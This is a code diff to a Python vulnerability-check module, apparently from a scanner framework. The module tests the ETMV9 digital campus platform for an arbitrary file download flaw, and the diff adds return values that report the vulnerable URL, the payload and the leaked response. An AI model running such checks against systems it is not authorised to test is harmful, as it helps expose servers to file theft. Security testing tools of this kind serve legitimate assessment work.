@@ -26,11 +26,14 @@ class etmdcp_Load_filedownload_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
                 cprint("[+]存在ETMV9数字化校园平台任意下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True,vulnurl,"ETMV9数字化校园平台任意下载",payload,req.text
             else:
                 cprint("[-]不存在etmdcp_Load_filedownload漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
